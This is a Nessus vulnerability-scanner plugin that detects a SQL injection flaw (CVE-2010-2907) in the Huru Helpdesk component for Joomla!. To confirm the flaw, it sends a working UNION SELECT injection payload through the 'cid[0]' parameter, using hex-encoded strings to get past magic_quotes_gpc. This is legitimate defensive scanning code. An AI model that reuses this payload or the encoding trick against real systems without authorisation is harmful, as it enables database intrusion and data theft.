#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(48203);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2017/05/19 13:58:06 $");

  script_cve_id("CVE-2010-2907");
  script_bugtraq_id(39366);
  script_osvdb_id(66741);
  script_xref(name:"EDB-ID", value:"14449");

  script_name(english:"Huru Helpdesk Component for Joomla! 'cid[0]' Parameter SQLi");
  script_summary(english:"Attempts to manipulate the info for a non-existent problem report.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Huru Helpdesk component for Joomla! running on the
remote host is affected by a SQL injection vulnerability due to
improper sanitization of user-supplied input to the 'cid[0]' parameter
before using it to construct database queries. Regardless of the PHP
'magic_quotes_gpc' setting, an unauthenticated, remote attacker can
exploit this issue to manipulate database queries, resulting in
disclosure of sensitive information, modification of data, or other
attacks against the underlying database.");
  # https://web.archive.org/web/20130120053712/http://huruhelpdesk.net/forums/8-announcements/410-version-088c-uploaded#410
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?29f83e28");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Huru Helpdesk version 0.88c or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/04/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "Huru Helpdesk";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('table.problemdetail');
  checks["/components/com_huruhelpdesk/css/huruhelpdesk.css"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

# Try to exploit the issue to manipulate the contact info for a non-existent problem.
magic1 = SCRIPT_NAME - ".nasl";
magic2 = unixtime();
exploit = "-1 UNION SELECT 1,2,3," + hexify(str:magic1) + "," + magic2 + ",6,7 -- ";

url = '/index.php?option=com_huruhelpdesk&view=detail&cid[0]=' + str_replace(find:" ", replace:"%20", string:exploit);

res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

if ('<div class="notetext"><b>' + magic1 + ' ' + magic2 + '</b><br' >< res[2])
{
  output = strstr(res[2], magic1);
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    sqli        : TRUE,
    generic     : TRUE,
    line_limit  : 3,
    request     : make_list(install_url + url),
    output      : chomp(output)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
